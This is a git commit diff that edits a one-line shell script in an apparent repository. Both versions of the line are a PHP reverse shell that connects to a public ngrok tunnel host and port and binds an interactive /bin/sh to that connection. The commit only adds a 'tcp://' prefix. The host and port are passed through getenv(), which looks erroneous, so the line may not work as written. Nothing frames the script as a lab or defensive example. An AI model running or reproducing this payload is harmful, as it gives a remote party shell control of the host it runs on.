b1fa105b7caf4a91fa430362cbc872d566f72ae8
kovaliv1990 <127501891+kovaliv1990@users.noreply.github.com>
2023-03-20 15:50:36 +0200

    Update 4.sh

--- pytcp/4.sh
+++ pytcp/4.sh
@@ -1,1 +1,1 @@
-php -r '$sock=fsockopen(getenv("2.tcp.eu.ngrok.io"),getenv("17016"));exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen(getenv("tcp://2.tcp.eu.ngrok.io"),getenv("17016"));exec("/bin/sh -i <&3 >&3 2>&3");'
